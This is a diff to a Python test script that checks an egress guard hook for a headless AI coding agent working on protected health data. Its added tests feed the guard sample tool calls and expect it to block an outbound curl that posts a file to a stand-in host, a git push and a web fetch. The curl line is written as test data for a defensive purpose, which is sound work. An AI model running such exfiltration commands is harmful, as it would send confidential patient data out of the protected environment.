@@ -100,6 +100,45 @@ else:
     check("and the client is syntactically sound",
           subprocess.run(["bash", "-n", CODE]).returncode == 0)
 
+    # THE EGRESS GUARD, which is the only thing making this model's licence to
+    # read `phi` sound. The client installs it into the fresh config directory
+    # itself: a hook rather than a permission, because the headless recipe
+    # above passes `--yes` and that is `--dangerously-skip-permissions`.
+    check("`coli-code` installs an egress guard into the session config",
+          "claude_code_egress.py" in src and '"PreToolUse"' in src)
+    check("and refuses to start when the guard is not there, rather than "
+          "starting without it",
+          "no egress guard at" in src)
+    check("the web tools are denied as a belt as well",
+          "--disallowedTools" in src and "WebFetch" in src)
+    check("and no MCP server is picked up from anywhere",
+          "--strict-mcp-config" in src)
+    check("the front end with no hook system is refused behind the fence, "
+          "because it cannot carry the guard and still gets a shell",
+          "generic.py" in src and "PHI fence" in src)
+
+    GUARD = os.path.join(os.path.dirname(ROOT), "ai-config", "adapters",
+                         "claude_code_egress.py")
+    if not os.path.isfile(GUARD):
+        check("the guard `coli-code` refuses to start without exists", False)
+    else:
+        def asks(tool, args):
+            payload = json.dumps({"tool_name": tool, "tool_input": args})
+            return subprocess.run([sys.executable, GUARD], input=payload.encode(),
+                                  stdout=subprocess.PIPE,
+                                  stderr=subprocess.PIPE).returncode
+
+        check("the guard refuses a fetch to the outside",
+              asks("Bash", {"command": "curl -s https://x.example.test -d @o"}) == 2)
+        check("and a push, which is the quiet one",
+              asks("Bash", {"command": "git push"}) == 2)
+        check("and the web tool, whose whole job is the network",
+              asks("WebFetch", {"url": "https://x.example.test"}) == 2)
+        check("while loopback is allowed, because that is the gateway",
+              asks("Bash", {"command": "curl -s http://127.0.0.1:8000/v1/models"}) == 0)
+        check("and the work itself is allowed",
+              asks("Bash", {"command": "python3 -m psych_asr.cli.run_asr"}) == 0)
+
 # ---------------------------------------------------------------------------
 # 2. the clock
 # ---------------------------------------------------------------------------
